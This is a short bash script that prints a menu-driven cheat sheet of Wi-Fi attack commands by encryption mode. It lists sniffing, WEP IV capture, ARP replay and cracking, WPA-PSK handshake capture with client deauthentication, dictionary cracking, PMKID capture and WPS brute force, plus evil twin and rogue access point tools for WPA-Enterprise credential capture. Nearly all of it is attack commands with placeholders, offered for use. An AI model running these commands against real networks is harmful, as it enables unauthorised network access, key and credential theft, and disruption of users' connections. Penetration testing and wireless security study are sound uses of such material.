#!/bin/bash

echo "Wi-Fi Attack Techniques Summary"
echo "----------------------------------"
echo "Modes:"
echo "  1. Open"
echo "  2. WEP"
echo "  3. WPA-PSK"
echo "  4. WPA-Enterprise"

echo ""
read -p "Enter mode number for command reference: " mode

case $mode in
  1)
    echo "Passive sniffing: airodump-ng wlan1"
    ;;
  2)
    echo "WEP IV Capture: airodump-ng -c <channel> --bssid <BSSID> -w wepcrack wlan1"
    echo "ARP Replay: aireplay-ng -3 -b <BSSID> -h <your MAC> wlan1"
    echo "Crack: aircrack-ng wepcrack.cap"
    ;;
  3)
    echo "Handshake: airodump-ng -c <channel> --bssid <BSSID> -w psk wlan1"
    echo "Deauth: aireplay-ng -0 10 -a <BSSID> -c <client MAC> wlan1"
    echo "Crack: aircrack-ng -w <wordlist> psk.cap"
    echo "PMKID: hcxdumptool -i wlan1mon -o dump.pcapng --enable_status=1"
    echo "WPS: reaver -i wlan1mon -b <BSSID> -vv"
    ;;
  4)
    echo "Evil Twin (hostapd-wpe), MSCHAPv2 hash capture"
    echo "Rogue AP with eaphammer or wifiphisher"
    ;;
  *)
    echo "Invalid option"
    ;;
esac
